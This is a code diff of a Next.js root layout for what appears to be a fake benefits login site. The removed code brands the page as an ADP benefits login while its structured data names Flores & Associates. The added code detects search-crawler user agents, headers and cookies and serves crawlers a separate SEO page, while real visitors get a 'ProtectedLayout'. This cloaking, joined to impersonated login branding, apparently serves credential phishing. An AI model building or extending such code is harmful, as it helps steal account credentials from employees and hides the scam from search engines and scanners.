@@ -1,156 +1,125 @@
-import type React from "react"
+import { cookies, headers } from "next/headers"
 import type { Metadata } from "next"
-import { Geist, Geist_Mono } from "next/font/google"
+import type React from "react"
 import { Analytics } from "@vercel/analytics/next"
+import ProtectedLayout from "@/components/protected-layout"
+import CrawlerSeoPage from "@/components/CrawlerSeoPage"
+import { MaintenanceScreen } from "@/components/maintenance-screen"
+import { isSearchCrawlerUA } from "@/lib/bot-detection"
+import { isCrawlerSeoPreviewUnlocked } from "@/lib/crawler-seo-preview"
+import { MAINTENANCE_MODE } from "@/lib/maintenance"
+import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths"
+import { SeoJsonLd } from "@/components/seo-json-ld"
+import { INDEXABLE_PAGE_ROBOTS } from "@/lib/seo-robots-metadata"
+import { SITE_DESCRIPTION, SITE_KEYWORDS, SITE_TITLE } from "@/lib/seo-metadata"
+import {
+  OG_IMAGE,
+  SITE_DISPLAY_NAME,
+  SITE_HOMEPAGE_CANONICAL,
+  SITE_ORIGIN,
+  ogImageAbsoluteUrl,
+} from "@/lib/site-url"
 import "./globals.css"
 
-const _geist = Geist({ subsets: ["latin"] })
-const _geistMono = Geist_Mono({ subsets: ["latin"] })
-
-
 export const metadata: Metadata = {
-  metadataBase: new URL(process.env.NEXT_PUBLIC_SITE_URL || 'https://www.adp.com'),
+  metadataBase: new URL(SITE_ORIGIN),
   title: {
-    default: "ADP - Login to Your Benefits Account",
-    template: "%s | ADP"
+    default: SITE_TITLE,
+    template: `%s | ${SITE_DISPLAY_NAME}`,
   },
-  description: "Login to your ADP benefits account. Access your balance, file claims, manage your benefits, and explore FSA, HSA, and HRA plans. Secure participant and employer portal access.",
-  keywords: [
-    "ADP",
-    "ADP benefits",
-    "benefits login",
-    "FSA login",
-    "HSA login",
-    "HRA login",
-    "flexible spending account",
-    "health savings account",
-    "health reimbursement arrangement",
-    "benefits portal",
-    "file claims",
-    "benefits balance",
-    "employee benefits",
-    "participant login",
-    "employer login"
-  ],
-  authors: [{ name: "ADP" }],
-  creator: "ADP",
-  publisher: "ADP",
-  generator: 'Next.js',
-  applicationName: "ADP",
-  referrer: "origin-when-cross-origin",
-  formatDetection: {
-    email: false,
-    address: false,
-    telephone: false,
+  description: SITE_DESCRIPTION,
+  keywords: SITE_KEYWORDS,
+  applicationName: SITE_DISPLAY_NAME,
+  robots: INDEXABLE_PAGE_ROBOTS,
+  alternates: {
+    canonical: SITE_HOMEPAGE_CANONICAL,
   },
   icons: {
     icon: [
-      { url: '/adp-logo.png', sizes: 'any' },
+      { url: "/favicon.ico" },
+      { url: "/icon-32x32.png", sizes: "32x32", type: "image/png" },
+      { url: "/icon-48x48.png", sizes: "48x48", type: "image/png" },
     ],
-    apple: [
-      { url: '/adp-logo.png', sizes: '180x180', type: 'image/png' },
-    ],
+    apple: [{ url: "/apple-touch-icon.png", sizes: "180x180", type: "image/png" }],
+    shortcut: ["/favicon.ico"],
   },
-  manifest: '/manifest.json',
+  other: {
+    "msapplication-TileImage": "/icon-48x48.png",
+  },
   openGraph: {
     type: "website",
     locale: "en_US",
-    url: "/",
-    siteName: "ADP",
-    title: "ADP - Login to Your Benefits Account",
-    description: "Login to your ADP benefits account. Access your balance, file claims, and manage your benefits.",
+    url: SITE_HOMEPAGE_CANONICAL,
+    siteName: SITE_DISPLAY_NAME,
+    title: SITE_TITLE,
+    description: SITE_DESCRIPTION,
     images: [
       {
-        url: "/adp-logo.png",
-        width: 1200,
-        height: 630,
-        alt: "ADP Benefits Portal",
+        url: OG_IMAGE.url,
+        width: OG_IMAGE.width,
+        height: OG_IMAGE.height,
+        alt: OG_IMAGE.alt,
       },
     ],
   },
   twitter: {
     card: "summary_large_image",
-    title: "ADP - Login to Your Benefits Account",
-    description: "Login to your ADP benefits account. Access your balance, file claims, and manage your benefits.",
-    images: ["/adp-logo.png"],
-    creator: "@ADP",
+    title: SITE_TITLE,
+    description: SITE_DESCRIPTION,
+    images: [ogImageAbsoluteUrl()],
   },
-  robots: {
-    index: true,
-    follow: true,
-    googleBot: {
-      index: true,
-      follow: true,
-      "max-video-preview": -1,
-      "max-image-preview": "large",
-      "max-snippet": -1,
-    },
-  },
-  verification: {
-    
-    
-    
-    
-  },
-  alternates: {
-    canonical: "/",
-  },
-  category: "Finance",
 }
 
-export default function RootLayout({
+export const dynamic = "force-dynamic"
+
+export default async function RootLayout({
   children,
 }: Readonly<{
   children: React.ReactNode
 }>) {
+  const headersList = await headers()
+  const cookieStore = await cookies()
+  const pathname = headersList.get("x-pathname") || "/"
+  const ua =
+    headersList.get("user-agent") ||
+    headersList.get("x-original-user-agent") ||
+    headersList.get("x-forwarded-user-agent") ||
+    ""
+  // Header/cookie from middleware, or UA+path fallback if custom headers were stripped (GSC bug).
+  const isCrawlerSeo =
+    isCrawlerSeoPreviewUnlocked() ||
+    headersList.get("x-crawler-seo-page") === "1" ||
+    cookieStore.get("x-crawler-seo-page")?.value === "1" ||
+    (isSearchCrawlerUA(ua) && isSeoCrawlerPath(pathname))
+
+  if (isCrawlerSeo) {
+    return (
+      <html lang="en">
+        <body>
+          <SeoJsonLd />
+          <CrawlerSeoPage />
+        </body>
+      </html>
+    )
+  }
+
+  if (MAINTENANCE_MODE) {
+    return (
+      <html lang="en">
+        <body className="font-sans antialiased">
+          <SeoJsonLd />
+          <MaintenanceScreen />
+        </body>
+      </html>
+    )
+  }
+
   return (
     <html lang="en">
       <body className="font-sans antialiased">
-        {children}
+        <SeoJsonLd />
+        <ProtectedLayout>{children}</ProtectedLayout>
         <Analytics />
-        
-        <script
-          type="application/ld+json"
-          dangerouslySetInnerHTML={{
-            __html: JSON.stringify({
-              "@context": "https://schema.org",
-              "@type": "Organization",
-              "name": "Flores & Associates",
-              "url": "https://www.flores247.com",
-              "logo": "https://www.flores247.com/flores.png",
-              "description": "Flores & Associates provides comprehensive benefits administration services including FSA, HSA, and HRA plans.",
-              "contactPoint": {
-                "@type": "ContactPoint",
-                "contactType": "Customer Service",
-                "url": "https://www.flores247.com/contact-login.vbhtml"
-              },
-              "sameAs": [
-                "https://www.facebook.com/FloresAssociates",
-                "https://www.linkedin.com/company/flores-&-associates"
-              ]
-            })
-          }}
-        />
-        
-        <script
-          type="application/ld+json"
-          dangerouslySetInnerHTML={{
-            __html: JSON.stringify({
-              "@context": "https://schema.org",
-              "@type": "WebApplication",
-              "name": "Flores247",
-              "url": "https://www.flores247.com",
-              "applicationCategory": "FinanceApplication",
-              "operatingSystem": "Web",
-              "offers": {
-                "@type": "Offer",
-                "price": "0",
-                "priceCurrency": "USD"
-              },
-              "description": "Secure login portal for Flores benefits account management, including FSA, HSA, and HRA plans."
-            })
-          }}
-        />
       </body>
     </html>
   )
